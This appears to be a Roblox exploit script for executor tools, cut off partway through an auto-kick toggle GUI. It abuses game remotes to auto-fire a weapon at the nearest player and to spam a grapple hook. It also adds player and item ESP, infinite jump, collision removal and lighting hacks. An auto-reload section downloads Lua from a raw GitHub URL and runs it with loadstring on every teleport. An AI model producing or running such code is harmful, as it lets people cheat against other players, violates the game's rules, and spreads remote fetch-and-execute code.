local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

--// =======================
--// AUTO-FIRE ON MANUAL EQUIP
--// =======================
local excludedUsers = {
    ["Kian6791"] = true,
    ["drkbone"] = true,
    ["lexmak"] = true,
    ["reconzb1111"] = true,
}

local ReverseRemoteIndex = {}
local ReverseRemoteObjects = {}

local netFolder = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local children = netFolder:GetChildren()

local remoteEvents = {}
for _, obj in ipairs(children) do
    if obj:IsA("RemoteEvent") then
        table.insert(remoteEvents, obj)
    end
end

for i = 1, #remoteEvents do
    local currentRemote = remoteEvents[i]
    local nextRemote = remoteEvents[i + 1]
    
    if nextRemote then
        ReverseRemoteIndex[nextRemote.Name] = currentRemote.Name
        ReverseRemoteObjects[nextRemote.Name] = currentRemote
    end
end

local correctRemoteName = ReverseRemoteIndex["RE/UseItem"]
local correctRemote = ReverseRemoteObjects["RE/UseItem"]

local currentTool = nil
local fireConnection = nil

local function fireToolAtPlayer(tool, target)
    if not tool or not target or not target.Character then return end
    if tool.Name ~= "Laser Cape" then return end
    
    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    if correctRemote then
        correctRemote:FireServer(hrp.Position, hrp)
    end
end

local function getClosestPlayer()
    local char = player.Character
    if not char then return nil end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    
    local closest, closestDist = nil, math.huge
    
    for _, other in ipairs(Players:GetPlayers()) do
        if other ~= player and other.Character and not excludedUsers[other.Name] then
            local ohrp = other.Character:FindFirstChild("HumanoidRootPart")
            if ohrp then
                local dist = (hrp.Position - ohrp.Position).Magnitude
                if dist < closestDist then
                    closestDist, closest = dist, other
                end
            end
        end
    end
    
    return closest
end

local function stopAutoFire()
    if fireConnection then
        fireConnection:Disconnect()
        fireConnection = nil
    end
end

local function startAutoFire(tool)
    stopAutoFire()
    fireConnection = RunService.Heartbeat:Connect(function()
        if not tool or tool.Parent ~= player.Character or tool.Name ~= "Laser Cape" then
            stopAutoFire()
            return
        end
        
        local target = getClosestPlayer()
        if target then
            fireToolAtPlayer(tool, target)
        end
    end)
end

RunService.Heartbeat:Connect(function()
    local char = player.Character
    if not char then return end
    
    local equippedTool = nil
    for _, item in ipairs(char:GetChildren()) do
        if item:IsA("Tool") and item.Name == "Laser Cape" then
            equippedTool = item
            break
        end
    end
    
    if equippedTool ~= currentTool then
        currentTool = equippedTool
        if currentTool then
            startAutoFire(currentTool)
        else
            stopAutoFire()
        end
    end
end)

-- =======================
-- Player esp
-- =======================
local visuals = {}
local BOX_COLOR = Color3.fromRGB(0, 200, 200)
local NAME_COLOR = Color3.fromRGB(100, 200, 255)
local BOX_TRANSPARENCY = 0.2
local function addVisuals(target)
    if visuals[target] then return end
    if target == player then return end
    local function setup(char)
        if not char then return end
        if visuals[target] then
            for _, obj in ipairs(visuals[target]) do
                if obj and obj.Parent then obj:Destroy() end
            end
        end
        local added = {}
        local box = Instance.new("SelectionBox")
        box.Name = "PlayerBox"
        box.Adornee = char
        box.LineThickness = 0.08
        box.Color3 = BOX_COLOR
        box.SurfaceTransparency = BOX_TRANSPARENCY
        box.Transparency = BOX_TRANSPARENCY
        box.Parent = char
        table.insert(added, box)
        local head = char:FindFirstChild("Head")
        if head then
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "PlayerNameTag"
            billboard.Adornee = head
            billboard.Size = UDim2.new(0, 150, 0, 30)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = char
            local nameLabel = Instance.new("TextLabel")
            nameLabel.Size = UDim2.new(1, 0, 1, 0)
            nameLabel.BackgroundTransparency = 1
            nameLabel.Text = target.DisplayName or target.Name
            nameLabel.TextColor3 = NAME_COLOR
            nameLabel.Font = Enum.Font.SourceSansBold
            nameLabel.TextSize = 18
            nameLabel.TextStrokeTransparency = 0.3
            nameLabel.Parent = billboard
            table.insert(added, billboard)
        end
        visuals[target] = added
    end
    setup(target.Character)
    target.CharacterAdded:Connect(setup)
end
local function removeVisuals(target)
    if visuals[target] then
        for _, obj in ipairs(visuals[target]) do
            if obj and obj.Parent then obj:Destroy() end
        end
        visuals[target] = nil
    end
end
for _, plr in ipairs(Players:GetPlayers()) do
    if plr ~= player then addVisuals(plr) end
end
Players.PlayerAdded:Connect(addVisuals)
Players.PlayerRemoving:Connect(removeVisuals)

-- =======================
-- TIMER ESP
-- =======================
-- LocalScript: Filtered Timer ESP (with exclusions, no minutes)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local overlayFolder = Instance.new("Folder")
overlayFolder.Name = "TimerOverlays"
overlayFolder.Parent = player:WaitForChild("PlayerGui")
-- helper to create floating text
local function makeBillboard(target, sourceLabel)
    local billboard = Instance.new("BillboardGui")
    billboard.Size = UDim2.new(0, 200, 0, 60)
    billboard.StudsOffset = Vector3.new(0, 5, 0)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 1e6
    billboard.Name = "TimerESP"
    billboard.Parent = overlayFolder
    billboard.Adornee = target
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
    textLabel.TextStrokeTransparency = 0
    textLabel.TextScaled = true
    textLabel.Parent = billboard
    -- update text every frame from the original label
    RunService.RenderStepped:Connect(function()
        if sourceLabel.Parent and target then
            local text = sourceLabel.Text
            if text == "0s" or text == "0" then
                textLabel.Text = "Unlocked"
                textLabel.TextColor3 = Color3.fromRGB(0, 255, 0) -- green
            else
                textLabel.Text = text
                textLabel.TextColor3 = Color3.fromRGB(0, 200, 255) -- blue
            end
        else
            billboard.Enabled = false
        end
    end)
end
-- helper to check exclusions
local function isExcluded(text)
    text = string.lower(text or "")
    return text:find("free") or text:find("sentry") or text:find("!") or text:find("m") or text:find("J3sus777")
end
-- scan workspace for timer UIs
local function scanTimers()
    for _, descendant in ipairs(workspace:GetDescendants()) do
        if descendant:IsA("TextLabel") and descendant.Text:match("%ds") and not isExcluded(descendant.Text) then
            local adornee = descendant:FindFirstAncestorWhichIsA("BasePart")
            if adornee and adornee.Position.Y <= 7 then
                makeBillboard(adornee, descendant)
            end
        end
    end
end
-- run once at start
scanTimers()
-- also watch for new ones
workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("TextLabel") and obj.Text:match("%ds") and not isExcluded(obj.Text) then
        local adornee = obj:FindFirstAncestorWhichIsA("BasePart")
        if adorne and adornee.Position.Y <= 7 then
            makeBillboard(adornee, obj)
        end
    end
end)
--// =======================
--// Brainrot esp
--// =======================
local EXCLUSION_ZONE = Vector3.new(0.03246767607386970, 2.76837086677551270, -1.08126354217529300)
local EXCLUSION_RADIUS = 20

local RunService = game:GetService("RunService")

local function parseMoney(text)
    text = string.lower(text or "")
    if not text:find("/s") then
        return 0
    end
    local num = tonumber(text:match("[%d%.]+")) or 0
    if text:find("k") then
        num *= 1e3
    elseif text:find("m") then
        num *= 1e6
    elseif text:find("b") then
        num *= 1e9
    elseif text:find("t") then
        num *= 1e12
    end
    return num
end

local function abbreviate(n)
    local abs = math.abs(n)
    if abs >= 1e12 then return string.format("%.2ft", n/1e12):gsub("%.0t","t") end
    if abs >= 1e9 then return string.format("%.2fb", n/1e9):gsub("%.0b","b") end
    if abs >= 1e6 then return string.format("%.2fm", n/1e6):gsub("%.0m","m") end
    if abs >= 1e3 then return string.format("%.2fk", n/1e3):gsub("%.0k","k") end
    return tostring(math.floor(n))
end

local function createLine(startPos, endPos)
    local distance = (endPos - startPos).Magnitude
    local direction = (endPos - startPos).Unit
    local line = Instance.new("Part")
    line.Name = "BestPetLine"
    line.Anchored = true
    line.CanCollide = false
    line.Size = Vector3.new(0.5, 0.5, distance)
    line.CFrame = CFrame.new(startPos + direction * distance / 2, endPos)
    line.Color = Color3.fromRGB(255, 0, 0)
    line.Material = Enum.Material.Neon
    line.Transparency = 0.3
    line.Parent = workspace
    return line
end

local function findAllPets()
    local results = {}
    
    local debrisFolder = workspace:FindFirstChild("Debris")
    if not debrisFolder then
        return results
    end
    
    for _, obj in ipairs(debrisFolder:GetChildren()) do
        if obj:IsA("BasePart") then
            local distance = (obj.Position - EXCLUSION_ZONE).Magnitude
            if distance <= EXCLUSION_RADIUS then
                continue
            end
            
            local displayNameLabel = nil
            local generationLabel = nil
            
            for _, child in ipairs(obj:GetChildren()) do
                if child:IsA("BillboardGui") or child:IsA("SurfaceGui") then
                    for _, label in ipairs(child:GetDescendants()) do
                        if label:IsA("TextLabel") then
                            local labelName = label.Name
                            local text = label.Text or ""
                            
                            if labelName == "DisplayName" then
                                displayNameLabel = label
                            elseif labelName == "Generation" and text:find("/s") then
                                generationLabel = label
                            end
                        end
                    end
                end
            end
            
            if displayNameLabel and generationLabel then
                local displayName = displayNameLabel.Text or "Unknown"
                local generation = generationLabel.Text or "0"
                local value = parseMoney(generation)
                
                if value > 0 then
                    table.insert(results, {
                        part = obj,
                        displayName = displayName,
                        generation = generation,
                        value = value
                    })
                end
            end
        end
    end
    
    return results
end

local tracked = {}
local currentLine = nil
local currentBestPart = nil

local function clearVisuals(part)
    if tracked[part] then
        for _, v in ipairs(tracked[part]) do
            if v and v.Destroy then v:Destroy() end
        end
        tracked[part] = nil
    end
end

local function clearAllVisuals()
    for part in pairs(tracked) do
        clearVisuals(part)
    end
    if currentLine then
        currentLine:Destroy()
        currentLine = nil
    end
    currentBestPart = nil
end

local function setVisuals(part, name, value)
    clearVisuals(part)
    
    local highlight = Instance.new("Highlight")
    highlight.Name = "PetHighlight_Client"
    highlight.FillColor = Color3.fromRGB(0,255,0)
    highlight.OutlineColor = Color3.fromRGB(255,255,255)
    highlight.FillTransparency = 0.5
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Adornee = part
    highlight.Parent = part
    
    local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
    if not playerGui then
        return
    end
    
    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Name = "PetBillboard_Client"
    billboardGui.Adornee = part
    billboardGui.Size = UDim2.new(0, 240, 0, 30)
    billboardGui.StudsOffset = Vector3.new(0, -2, 0)
    billboardGui.AlwaysOnTop = true
    billboardGui.MaxDistance = 1e6
    billboardGui.Parent = playerGui
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextScaled = true
    textLabel.TextStrokeTransparency = 0
    textLabel.TextColor3 = highlight.FillColor
    textLabel.Parent = billboardGui
    
    textLabel.Text = string.format("%s | $%s/s", name, abbreviate(value))
    
    tracked[part] = { highlight, billboardGui, textLabel }
end

local function updateBest()
    local allPets = findAllPets()
    
    local bestValue = -math.huge
    local bestPet = nil
    
    for _, petData in ipairs(allPets) do
        if petData.value > bestValue then
            bestValue = petData.value
            bestPet = petData
        end
    end
    
    if currentBestPart and (not bestPet or currentBestPart ~= bestPet.part) then
        clearVisuals(currentBestPart)
    end
    
    if bestPet then
        setVisuals(bestPet.part, bestPet.displayName, bestPet.value)
        currentBestPart = bestPet.part
    else
        currentBestPart = nil
    end
end

local player = game.Players.LocalPlayer

player.CharacterAdded:Connect(function()
    clearAllVisuals()
    task.wait(1)
end)

RunService.Heartbeat:Connect(function()
    if currentLine then
        currentLine:Destroy()
        currentLine = nil
    end
    
    if currentBestPart and currentBestPart.Parent and player.Character then
        local root = player.Character:FindFirstChild("HumanoidRootPart")
        if root then
            currentLine = createLine(root.Position, currentBestPart.Position)
        end
    end
end)

task.spawn(function()
    while true do
        updateBest()
        task.wait(0.1)
    end
end)

-- =======================
-- infinite jump
-- =======================

local humanoid, rootPart
local function updateCharacter()
    local char = player.Character or player.CharacterAdded:Wait()
    humanoid = char:WaitForChild("Humanoid")
    rootPart = char:WaitForChild("HumanoidRootPart")
    humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
        if humanoid.Jump and rootPart then
            rootPart.Velocity = Vector3.new(rootPart.Velocity.X, 50, rootPart.Velocity.Z)
        end
    end)
end
player.CharacterAdded:Connect(updateCharacter)
if player.Character then updateCharacter() end

-- =======================
-- AUTO-RELOAD ON TELEPORT (Lean & Session-Only)
-- =======================
local ADMIN_RAW_URL = "https://raw.githubusercontent.com/thetoaster97/99123/refs/heads/main/176.lua" -- replace with your raw script URL
-- Use a session-only flag so it only queues if you already executed this session
if shared._AutoReloadQueued then
    return -- already queued this session, do nothing
end
shared._AutoReloadQueued = true
-- find queue_on_teleport function
local function find_queue()
    if type(queue_on_teleport) == "function" then return queue_on_teleport end
    if syn and type(syn.queue_on_teleport) == "function" then return syn.queue_on_teleport end
    if secure_load and type(secure_load.queue_on_teleport) == "function" then return secure_load.queue_on_teleport end
    if KRNL and type(KRNL.queue_on_teleport) == "function" then return KRNL.queue_on_teleport end
    for k,v in pairs(_G) do
        if type(v) == "function" and tostring(k):lower():find("queue_on_teleport") then
            return v
        end
    end
    return nil
end
local queue_func = find_queue()
if queue_func and ADMIN_RAW_URL and ADMIN_RAW_URL ~= "" then
    local queued_payload = [[
        local url = "]] .. ADMIN_RAW_URL .. [["
        local function safeGet(u)
            if syn and type(syn.request) == "function" then
                local ok,res = pcall(function() return syn.request({Url=u,Method="GET"}).Body end)
                if ok and res then return res end
            end
            if type(http_request)=="function" then
                local ok,res = pcall(function() return http_request({Url=u}).Body end)
                if ok and res then return res end
            end
            if type(request)=="function" then
                local ok,res = pcall(function() return request({Url=u}).Body end)
                if ok and res then return res end
            end
            if type(game.HttpGet)=="function" then
                local ok,res = pcall(function() return game:HttpGet(u) end)
                if ok and res then return res end
            end
            local HttpService = game:GetService("HttpService")
            local ok,res = pcall(function() return HttpService:GetAsync(u) end)
            if ok and res then return res end
            return nil
        end
        local code = safeGet(url)
        if code then
            local fn = loadstring(code)
            if fn then pcall(fn) end
        end
    ]]
    pcall(function() queue_func(queued_payload) end)
    print("[Auto-Reload] Script queued for teleport/rejoin.")
else
    warn("[Auto-Reload] queue_on_teleport API not available.")
end
--// =======================
--// CAMERA NOCLIP
--// =======================
local UserInputService = game:GetService("UserInputService")
local camera = workspace.CurrentCamera

-- Lower camera sensitivity
UserInputService.MouseDeltaSensitivity = 0.2

-- Disable camera occlusion
pcall(function()
    player.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
end)

-- Set camera properties to allow noclip
RunService.RenderStepped:Connect(function()
    pcall(function()
        -- Keep camera in custom mode (not scriptable which locks it)
        if camera.CameraType ~= Enum.CameraType.Custom then
            camera.CameraType = Enum.CameraType.Custom
        end
        
        -- Set camera subject to humanoid to maintain control
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            camera.CameraSubject = player.Character.Humanoid
        end
        
        -- Disable camera collision
        sethiddenproperty(camera, "HeadScale", 0)
    end)
end)

-- Remove camera collision using zoom manipulation
player.CameraMaxZoomDistance = 50
player.CameraMinZoomDistance = 0.5

--// =======================
--// FULLBRIGHT + MATERIALS + DECORATIONS
--// =======================
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")

-- FULLBRIGHT / balanced day
local function applyFullBright()
	Lighting.ClockTime = 12
	Lighting.TimeOfDay = "12:00:00"
	Lighting.Brightness = 1
	Lighting.ExposureCompensation = 0
	Lighting.Ambient = Color3.fromRGB(200,200,200)
	Lighting.OutdoorAmbient = Color3.fromRGB(200,200,200)
	Lighting.FogEnd = 100000
	Lighting.GlobalShadows = false
end

applyFullBright()
RunService.RenderStepped:Connect(applyFullBright)

-- SmoothPlastic → Air
local function makeAir(part)
	if part:IsA("BasePart") and part.Material == Enum.Material.SmoothPlastic then
		part.Material = Enum.Material.Air
	end
end

for _, part in ipairs(Workspace:GetDescendants()) do
	makeAir(part)
end
Workspace.DescendantAdded:Connect(makeAir)

-- Decorations → 40% transparent (recursive)
local function applyDecorationsTransparency(parent)
	for _, obj in ipairs(parent:GetDescendants()) do
		if obj:IsA("Folder") and obj.Name == "Decorations" then
			for _, part in ipairs(obj:GetDescendants()) do
				if part:IsA("BasePart") then
					part.Transparency = 0.4
				end
			end
		end
	end
end

-- Apply to existing hierarchy
applyDecorationsTransparency(Workspace)

-- Monitor new folders or parts
Workspace.DescendantAdded:Connect(function(obj)
	if obj:IsA("Folder") and obj.Name == "Decorations" then
		for _, part in ipairs(obj:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Transparency = 0.4
			end
		end
	elseif obj:IsA("BasePart") then
		local parent = obj:FindFirstAncestorWhichIsA("Folder")
		while parent do
			if parent.Name == "Decorations" then
				obj.Transparency = 0.4
				break
			end
			parent = parent.Parent
		end
	end
end)

--------------------------------------------------------------------
-- REMOVE ALL CLOTHES & ACCESSORIES (merged)
--------------------------------------------------------------------
-- Function to strip clothing/accessories from a character
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local equipDebounce = {}
local EQUIP_COOLDOWN = 0.5

local function stripVisualItems(character)
	if not character then return end
	
	for _, item in ipairs(character:GetChildren()) do
		if item:IsA("Accessory")
			or item:IsA("Clothing")
			or item:IsA("ShirtGraphic")
			or item:IsA("Pants")
			or item:IsA("Shirt")
			or item:IsA("LayeredClothing")
		then
			item:Destroy()
		end
	end
end

local function setupAntiLag(character)
	if not character then return end
	
	local humanoid = character:WaitForChild("Humanoid", 5)
	if not humanoid then return end
	
	humanoid.ChildAdded:Connect(function(child)
		if child:IsA("Tool") then
			local plr = Players:GetPlayerFromCharacter(character)
			if not plr then return end
			
			local userId = plr.UserId
			local currentTime = tick()
			
			if equipDebounce[userId] and (currentTime - equipDebounce[userId]) < EQUIP_COOLDOWN then
				child:Destroy()
				return
			end
			
			equipDebounce[userId] = currentTime
		end
	end)
end

local function setupContinuousStripping(character)
	if not character then return end
	
	character.ChildAdded:Connect(function(child)
		if child:IsA("Accessory")
			or child:IsA("Clothing")
			or child:IsA("ShirtGraphic")
			or child:IsA("Pants")
			or child:IsA("Shirt")
			or child:IsA("LayeredClothing")
		then
			child:Destroy()
		end
	end)
end

local function handleCharacter(character)
	if not character then return end
	
	task.wait(0.1)
	stripVisualItems(character)
	setupAntiLag(character)
	setupContinuousStripping(character)
	
	task.spawn(function()
		for i = 1, 5 do
			task.wait(0.2)
			stripVisualItems(character)
		end
	end)
end

for _, plr in ipairs(Players:GetPlayers()) do
	if plr.Character then
		handleCharacter(plr.Character)
	end
	
	plr.CharacterAdded:Connect(function(char)
		handleCharacter(char)
	end)
end

Players.PlayerAdded:Connect(function(plr)
	plr.CharacterAdded:Connect(function(char)
		handleCharacter(char)
	end)
	
	if plr.Character then
		handleCharacter(plr.Character)
	end
end)

if player.Character then
	handleCharacter(player.Character)
end

player.CharacterAdded:Connect(function(char)
	handleCharacter(char)
end)

--// =======================
--// GHOST PLAYERS / TRAP HANDLER
--// =======================

local Players   = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local task      = task

-- Weak tables so parts can be GC'd
local tracked = {
    others = setmetatable({}, { __mode = "k" }),
    localp = setmetatable({}, { __mode = "k" }),
    trap   = setmetatable({}, { __mode = "k" }),
}
local conns = setmetatable({}, { __mode = "k" })

local function safeSet(part, prop, val)
    if not part or not part.Parent then return end
    pcall(function() part[prop] = val end)
end

local function safeGet(part, prop)
    if not part or not part.Parent then return nil end
    local ok, v = pcall(function() return part[prop] end)
    return ok and v or nil
end

-- Desired states
local function applyOtherSettings(part)
    safeSet(part, "CanCollide", false)
    safeSet(part, "CanQuery",   false)
    safeSet(part, "CanTouch",   false)
end

local function applyLocalSettings(part)
    -- FIXED: Keep CanTouch enabled so you can touch buttons/plates
    safeSet(part, "CanQuery", false)
    -- Don't modify CanTouch - leave it as default (true)
end

local function applyTrapSettings(part)
    safeSet(part, "CanCollide", false)
    safeSet(part, "CanQuery",   false)
    safeSet(part, "CanTouch",   false)
end

local function stopWatching(part)
    local list = conns[part]
    if list then
        for _, c in ipairs(list) do
            pcall(function() c:Disconnect() end)
        end
        conns[part] = nil
    end
    tracked.others[part] = nil
    tracked.localp[part] = nil
    tracked.trap[part] = nil
end

local function watchPart(part, category)
    if not part or not part:IsA("BasePart") then return end
    if conns[part] then return end
    conns[part] = {}
    
    if category == "others" then 
        tracked.others[part] = true 
        applyOtherSettings(part)
    elseif category == "local" then 
        tracked.localp[part] = true 
        applyLocalSettings(part)
    elseif category == "trap" then 
        tracked.trap[part] = true 
        applyTrapSettings(part) 
    end
    
    -- FIXED: Only watch CanQuery for local player, not CanTouch
    local props = {}
    if category == "others" then 
        props = {"CanCollide","CanQuery","CanTouch"}
    elseif category == "local" then 
        props = {"CanQuery"} -- Removed CanTouch from monitoring
    elseif category == "trap" then 
        props = {"CanCollide","CanQuery","CanTouch"} 
    end
    
    for _, prop in ipairs(props) do
        local ok, sig = pcall(function() return part:GetPropertyChangedSignal(prop) end)
        if ok and sig then
            table.insert(conns[part], sig:Connect(function()
                task.defer(function()
                    if not part or not part.Parent then return end
                    if category == "others" then applyOtherSettings(part)
                    elseif category == "local" then applyLocalSettings(part)
                    elseif category == "trap"   then applyTrapSettings(part) end
                end)
            end))
        end
    end
    
    table.insert(conns[part], part.AncestryChanged:Connect(function()
        if not part:IsDescendantOf(game) then
            stopWatching(part)
        end
    end))
end

local function applyToContainer(container, category)
    if not container then return end
    for _, obj in ipairs(container:GetDescendants()) do
        if obj:IsA("BasePart") then
            watchPart(obj, category)
        end
    end
    container.DescendantAdded:Connect(function(desc)
        if desc:IsA("BasePart") then
            watchPart(desc, category)
        end
    end)
end

-- Other players
local function onOtherPlayerAdded(player)
    if player == LocalPlayer then return end
    player.CharacterAdded:Connect(function(char)
        applyToContainer(char, "others")
    end)
    if player.Character then applyToContainer(player.Character, "others") end
end

for _, p in ipairs(Players:GetPlayers()) do onOtherPlayerAdded(p) end
Players.PlayerAdded:Connect(onOtherPlayerAdded)

-- Local player
local function onLocalCharacter(char)
    if not char then return end
    applyToContainer(char, "local")
end

if LocalPlayer.Character then onLocalCharacter(LocalPlayer.Character) end
LocalPlayer.CharacterAdded:Connect(onLocalCharacter)

-- Workspace traps
local function processWorkspacePart(p)
    if not p:IsA("BasePart") then return end
    local name = (p.Name or ""):lower()
    if name:find("trap") then
        watchPart(p, "trap")
    end
end

for _, obj in ipairs(Workspace:GetDescendants()) do processWorkspacePart(obj) end
Workspace.DescendantAdded:Connect(processWorkspacePart)

-- Periodic enforcer - FIXED: Don't enforce CanTouch on local parts
task.spawn(function()
    while true do
        task.wait(0.35)
        for part in pairs(tracked.others) do 
            if part and part.Parent then applyOtherSettings(part) end 
        end
        for part in pairs(tracked.localp) do 
            if part and part.Parent then applyLocalSettings(part) end 
        end
        for part in pairs(tracked.trap) do 
            if part and part.Parent then applyTrapSettings(part) end 
        end
    end
end)

--// =======================
--// GRAPPLE-HOOK SPEED 
--// =======================
do
    local RunService = game:GetService("RunService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    -- Configuration
    local FIRE_INTERVAL = 0.1 -- Fire 10x/sec
    local SPEED_MULTIPLIER = 5 -- Movement boost multiplier
    local GRAPPLE_TOOL_NAME = "Grapple Hook" -- Tool name
    local Event = ReplicatedStorage.Packages.Net:WaitForChild("RE/UseItem")
    local movementConnection, fireConnection
    local isHoldingGrapple = false
    -- Check if player holds Grapple Hook
    local function checkForGrappleHook()
        if character then
            local tool = character:FindFirstChild(GRAPPLE_TOOL_NAME)
            return tool and tool:IsA("Tool")
        end
        return false
    end
    -- Apply speed boost using AssemblyLinearVelocity
    local function applyDirectVelocity()
        if character and character:FindFirstChild("HumanoidRootPart") and isHoldingGrapple then
            local rootPart = character.HumanoidRootPart
            local moveVector = humanoid.MoveDirection
            if moveVector.Magnitude > 0 then
                local currentVelocity = rootPart.AssemblyLinearVelocity
                rootPart.AssemblyLinearVelocity = Vector3.new(
                    moveVector.X * humanoid.WalkSpeed * SPEED_MULTIPLIER,
                    currentVelocity.Y,
                    moveVector.Z * humanoid.WalkSpeed * SPEED_MULTIPLIER
                )
            end
        end
    end
    -- Fire Grapple Hook remotely
    local function fireGrappleHook()
        if isHoldingGrapple then
            pcall(function()
                Event:FireServer(0.70743885040283)
            end)
        end
    end
    -- Loop auto-fire
    local function startFireLoop()
        if fireConnection then fireConnection:Disconnect() end
        fireConnection = spawn(function()
            while character and character.Parent do
                fireGrappleHook()
                wait(FIRE_INTERVAL)
            end
        end)
    end
    -- Loop movement speed
    local function startMovementLoop()
        if movementConnection then movementConnection:Disconnect() end
        movementConnection = RunService.Heartbeat:Connect(function()
            isHoldingGrapple = checkForGrappleHook()
            applyDirectVelocity()
        end)
    end
    -- Initialize loops
    local function initialize()
        startFireLoop()
        startMovementLoop()
        print("Grapple is on")
    end
    -- Handle respawn
    local function onCharacterAdded(newChar)
        character = newChar
        humanoid = character:WaitForChild("Humanoid")
        isHoldingGrapple = false
        if movementConnection then movementConnection:Disconnect() movementConnection = nil end
        if fireConnection then fireConnection:Disconnect() fireConnection = nil end
        task.wait(1)
        initialize()
    end
    player.CharacterAdded:Connect(onCharacterAdded)
    if character and character.Parent then initialize() end
    -- Cleanup on leaving
    Players.PlayerRemoving:Connect(function(plr)
        if plr == player then
            if movementConnection then movementConnection:Disconnect() end
            if fireConnection then fireConnection:Disconnect() end
        end
    end)
end

--// =======================
--// BASE LINE + BLACK DECORATIONS
--// =======================

do
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local player = Players.LocalPlayer

    -- Find the billboard that is VISIBLE
    local function findBaseBillboard()
        local visibleBillboards = {}
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BillboardGui") and obj.Enabled then
                for _, child in ipairs(obj:GetDescendants()) do
                    if child:IsA("TextLabel") and child.Visible then
                        if string.upper(child.Text) == "YOUR BASE" and child.TextTransparency < 1 then
                            table.insert(visibleBillboards, obj)
                        end
                    end
                end
            end
        end
        if #visibleBillboards > 1 and player.Character then
            local root = player.Character:FindFirstChild("HumanoidRootPart")
            if root then
                local closest, closestDist
                for _, billboard in ipairs(visibleBillboards) do
                    local pos
                    if billboard.Parent and billboard.Parent:IsA("BasePart") then
                        pos = billboard.Parent.Position
                    elseif billboard.Parent and billboard.Parent:IsA("Model") then
                        local part = billboard.Parent:FindFirstChildWhichIsA("BasePart", true)
                        if part then pos = part.Position end
                    end
                    if pos then
                        local dist = (pos - root.Position).Magnitude
                        if not closest or dist < closestDist then
                            closestDist = dist
                            closest = billboard
                        end
                    end
                end
                if closest then return closest end
            end
        end
        return visibleBillboards[1]
    end

    -- Create a simple line between two points
    local function createLine(startPos, endPos)
        local distance = (endPos - startPos).Magnitude
        local direction = (endPos - startPos).Unit
        local line = Instance.new("Part")
        line.Name = "BaseLine"
        line.Anchored = true
        line.CanCollide = false
        line.Size = Vector3.new(0.5, 0.5, distance)
        line.CFrame = CFrame.new(startPos + direction * distance / 2, endPos)
        line.Color = Color3.fromRGB(255, 140, 0)
        line.Material = Enum.Material.Neon
        line.Transparency = 0.3
        line.Parent = workspace
        return line
    end

    -- Find and color the Decorations folder black
    local function findAndColorDecorations(billboard)
        local baseModel = billboard.Parent
        if not baseModel then return end
        local parentModel = baseModel.Parent
        if not parentModel then return end
        local decorations = parentModel:FindFirstChild("Decorations")
        if not decorations then return end
        for _, obj in ipairs(decorations:GetDescendants()) do
            if obj:IsA("BasePart") or obj:IsA("MeshPart") then
                obj.Color = Color3.fromRGB(0, 0, 0) -- Black
                obj.Material = Enum.Material.SmoothPlastic
            end
        end
    end

    -- Main
    local billboard = findBaseBillboard()
    if billboard then
        local targetPos
        if billboard.Adornee then
            targetPos = billboard.Adornee.Position
        elseif billboard.Parent and billboard.Parent:IsA("BasePart") then
            targetPos = billboard.Parent.Position
        elseif billboard.Parent and billboard.Parent:IsA("Model") then
            local part = billboard.Parent:FindFirstChildWhichIsA("BasePart", true)
            if part then targetPos = part.Position end
        end

        if targetPos then
            findAndColorDecorations(billboard)
            local currentLine
            RunService.Heartbeat:Connect(function()
                if not player.Character then return end
                local root = player.Character:FindFirstChild("HumanoidRootPart")
                if not root then return end
                if currentLine then currentLine:Destroy() end
                currentLine = createLine(root.Position, targetPos)
            end)
        end
    end
end

--// =======================
--// AUTO-KICK ON "YOU STOLE" DETECTION (CLEAN TEXT, NO RICHTEXT TAGS)
--// =======================
do
    local playerGui = player:WaitForChild("PlayerGui")
    local kickEnabled = true -- Start enabled
    
    -- Create Toggle GUI
    local function createToggleGUI()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "AutoKickToggleGUI"
        screenGui.ResetOnSpawn = false
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
        -- Main Button
        local button = Instance.new("TextButton")
        button.Name = "ToggleButton"
        button.Size = UDim2.new(0, 140, 0, 40)
        button.Position = UDim2.new(0.5, -70, 0, 10) -- Top middle
        button.AnchorPoint = Vector2.new(0.5, 0)
        button.BackgroundColor3 = Color3.fromRGB(0, 200, 0) -- Green when on
        button.Text = "AUTO-KICK: ON"
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.TextSize = 16
        button.Font = Enum.Font.GothamBold
        button.BorderSizePixel = 0
        button.Parent = screenGui
        
        -- Rounded corners
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 8)
        corner.Parent = button
        
